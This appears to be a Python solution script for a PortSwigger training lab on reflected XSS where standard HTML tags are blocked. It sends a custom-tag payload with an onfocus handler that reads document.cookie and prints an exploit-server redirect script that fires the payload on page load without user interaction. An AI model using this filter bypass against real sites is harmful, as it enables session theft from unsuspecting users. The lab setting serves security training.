# Lab 18 — Reflected XSS into HTML context with all tags blocked except custom ones
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked
#
# Vulnerability: Search — all standard HTML tags blocked; custom elements allowed
# Aim:           Call alert(document.cookie) via exploit server delivery
#
# Technique:
#   Standard HTML tags (<img>, <script>, <body> etc.) all return 400.
#   Custom/unknown tag names are allowed — browsers render them as generic elements.
#
#   Custom element with onfocus + tabindex:
#     <xss id=x onfocus=alert(document.cookie) tabindex=1>
#
#   tabindex=1 makes the element focusable (required for onfocus to fire).
#   The #x URL fragment causes the browser to auto-focus id="x" on page load
#   → onfocus fires immediately, no user interaction needed.
#
#   Deliver via exploit server — victim delivery cannot be automated with requests.
#
# Usage: python xss_lab18.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SEARCH_PAYLOAD = "<xss id=x onfocus=alert(document.cookie) tabindex=1>"

if __name__ == "__main__":
    banner()
    section("LAB 18 — REFLECTED XSS: ALL STANDARD TAGS BLOCKED (CUSTOM TAG)")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab18.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Verifying custom tag payload reflects: {SEARCH_PAYLOAD}\n")
    r = session.get(url, params={"search": SEARCH_PAYLOAD})
    check_reflection(r.text, SEARCH_PAYLOAD, "Custom tag payload")

    # The full URL with #x fragment (fragment is never sent to server — append manually)
    full_url = f"{url}/?search={SEARCH_PAYLOAD.replace(' ', '+').replace('=', '%3D')}#x"

    exploit = (
        "<script>\n"
        f"location = '{url}/?search=%3Cxss+id%3Dx+"
        "onfocus%3Dalert(document.cookie)+tabindex%3D1%3E#x';\n"
        "</script>"
    )

    print_box("EXPLOIT SERVER BODY — paste this into the Body field", exploit)

    print("  ➜  Steps:")
    print("     1. Go to the exploit server")
    print("     2. Paste the script above into the Body field (replace YOUR-LAB-ID)")
    print("     3. Click 'Store', then 'Deliver exploit to victim'")
    print()
    print("  ℹ  Custom tags are valid HTML5 — only known tag names are WAF-blocked.")
    print("     tabindex=1 makes it focusable. #x auto-focuses on load → onfocus fires.")
